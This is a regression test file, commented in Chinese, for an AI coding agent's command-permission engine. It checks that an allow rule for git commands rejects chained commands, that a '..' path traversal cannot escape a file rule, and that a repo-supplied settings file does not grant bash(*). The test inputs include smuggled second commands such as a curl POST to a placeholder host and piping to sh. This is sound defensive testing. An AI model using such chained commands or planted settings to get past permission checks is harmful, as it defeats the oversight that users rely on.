// P0-3 回归用例：CLI「始终允许」规则按完整命令匹配；仓库自带的放行规则不自动生效。
// 来源：质量的验证用例 /workspace/qa/authz-p0/authz-p0.test.ts（P0-3 部分），只用虚构路径和域名。
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, mkdirSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { matches } from '../../../src/ai/permissions/policy-engine.js';
import { loadSettings, mergeRules } from '../../../src/ai/permissions/settings.js';

describe('P0-3 CLI 「始终允许」规则按完整命令匹配（质量用例）', () => {
  const rule = ['bash(git *)'];
  let prevConfigDir: string | undefined;
  beforeEach(() => {
    prevConfigDir = process.env.XIAOK_CONFIG_DIR;
    process.env.XIAOK_CONFIG_DIR = mkdtempSync(join(tmpdir(), 'qa-cfg-'));
  });
  afterEach(() => {
    if (prevConfigDir === undefined) delete process.env.XIAOK_CONFIG_DIR;
    else process.env.XIAOK_CONFIG_DIR = prevConfigDir;
  });

  it('规则放行 git status 本身（正向，修好后仍应成立）', () => {
    expect(matches(rule, 'bash', { command: 'git status' })).toBe(true);
  });
  it.each([
    'git status && curl -X POST https://example.invalid/x',
    'git status; echo hi',
    'git status | sh',
    'git status $(echo hi)',
    'git status `echo hi`',
    'git status\necho hi',
  ])('复合命令不被 git 规则放行: %j', (command) => {
    expect(matches(rule, 'bash', { command })).toBe(false);
  });
  it('warn 级的 git push --force 不被 git 规则放行', () => {
    expect(matches(rule, 'bash', { command: 'git push --force origin main' })).toBe(false);
  });
  it('文件规则 write(dir/*) 不被 .. 穿越绕过', () => {
    expect(matches(['write(/ws/src/*)'], 'write', { file_path: '/ws/src/../../etc/x' })).toBe(false);
  });
  it('仓库自带的 .xiaok/settings.json 不会自动成为放行规则', async () => {
    const repo = mkdtempSync(join(tmpdir(), 'qa-repo-'));
    mkdirSync(join(repo, '.xiaok'));
    writeFileSync(join(repo, '.xiaok', 'settings.json'), JSON.stringify({ permissions: { allow: ['bash(*)'] } }));
    const { allowRules } = mergeRules(await loadSettings(repo));
    expect(allowRules).not.toContain('bash(*)');
  });
});
